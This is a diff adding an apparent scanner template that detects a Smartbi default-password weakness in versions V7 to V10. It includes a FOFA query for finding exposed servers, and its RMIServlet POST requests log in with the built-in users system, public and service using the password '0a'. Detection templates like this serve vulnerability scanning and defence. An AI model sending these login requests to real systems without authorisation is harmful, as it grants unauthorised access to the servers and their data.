@@ -1,0 +1,46 @@
+id: smartbi-bypass-builtin-user-login
+
+info:
+  name: Smartbi Default User Weak Password
+  author: xpoc
+  severity: high
+  verified: true
+  description: |
+    FOFA: app="SMARTBI" || body="gcfutil = jsloader.resolve('smartbi.gcf.gcfutil')"
+  solutions: "V7 <= Smartbi <= V10"
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=113
+  tags: smartbi,weakpass
+  created: 2023/06/23
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /smartbi/vision/RMIServlet
+    expression: response.status == 200 && response.body.bcontains(b'"retCode":"CLIENT_USER_NOT_LOGIN"')
+  r1:
+    request:
+      method: POST
+      path: /smartbi/vision/RMIServlet
+      body: |
+        className=UserService&methodName=loginFromDB&params=["system","0a"]
+    expression: response.status == 200 && response.body.bcontains(b'"result":true') && response.body.bcontains(b'"retCode":0')
+    stop_if_match: true
+  r2:
+    request:
+      method: POST
+      path: /smartbi/vision/RMIServlet
+      body: |
+        className=UserService&methodName=loginFromDB&params=["public","0a"]
+    expression: response.status == 200 && response.body.bcontains(b'"result":true') && response.body.bcontains(b'"retCode":0')
+    stop_if_match: true
+  r3:
+    request:
+      method: POST
+      path: /smartbi/vision/RMIServlet
+      body: |
+        className=UserService&methodName=loginFromDB&params=["service","0a"]
+    expression: response.status == 200 && response.body.bcontains(b'"result":true') && response.body.bcontains(b'"retCode":0')
+    stop_if_match: true
+expression: (r0() && r1()) || (r0() && r2()) || (r0() && r3())
